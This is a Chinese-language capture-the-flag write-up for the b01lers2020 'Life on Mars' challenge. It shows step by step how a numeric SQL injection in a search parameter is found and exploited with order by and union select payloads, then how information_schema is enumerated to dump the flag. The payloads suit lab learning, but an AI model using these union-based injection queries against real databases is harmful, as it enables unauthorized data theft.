# \[b01lers2020]Life on Mars

## \[b01lers2020]Life on Mars

## 考点

* union联合注入
* 表面字符串实则数字注入

## wp

F12查看请求

```
http://09ed22c1-cc7a-4cb0-a22b-5b20d4f7106a.node4.buuoj.cn:81/query?search=utopia_basin&{}&_=1646642480869
http://09ed22c1-cc7a-4cb0-a22b-5b20d4f7106a.node4.buuoj.cn:81/query?search=amazonis_planitia&{}&_=1646642480867
http://09ed22c1-cc7a-4cb0-a22b-5b20d4f7106a.node4.buuoj.cn:81/query?search=tharsis_rise&{}&_=1646642480870
```

大概可以看出来GET传入的`_`是时间戳加3位数字，中间传一个`{}`没看出来啥用，前面一个`query`大概率注入

```
http://09ed22c1-cc7a-4cb0-a22b-5b20d4f7106a.node4.buuoj.cn:81/query?search=aaaa
```

传入`aaaa`直接返回1，传`utopia_basin%23`返回正常，确定存在注入。

传`utopia_basin'%23`返回1，传`utopia_basin"%23`返回1。

直接试试order by，传`chryse_planitia order by 5%23`返回2，然后一个一个试，发现传入传`chryse_planitia order by 2%23`返回正常

传入`a union select 1,2%23`，返回1

传入`chryse_planitia union select 1,2%23`，在最后一行看到结果1，2

剩下的就是纯手工注入了

```
select version()   # 5.7.29
select database()  # aliens
select group_concat(schema_name) from information_schema.schemata
# information_schema,alien_code,aliens

select group_concat(table_name) from information_schema.tables where table_schema='aliens'
# amazonis_planitia,arabia_terra,chryse_planitia,hellas_basin,hesperia_planum,noachis_terra,olympus_mons,tharsis_rise,utopia_basin
select group_concat(table_name) from information_schema.tables where table_schema='alien_code'
# code
select group_concat(column_name) from information_schema.columns where table_name='code'
# id,code
select group_concat(code) from alien_code.code
# flag{dd3169e5-e69e-41fc-91e6-a52dc4f8545b}
```

## 小结

* 类似这种`'#` 闭合返回正常的大概率是字符型注入，类似这种`#` 闭合返回正常的大概率是数字型注入
* 如果注入没反应，就可以考虑直接`order by 10`
* 注入时要判断不同结果对应的页面
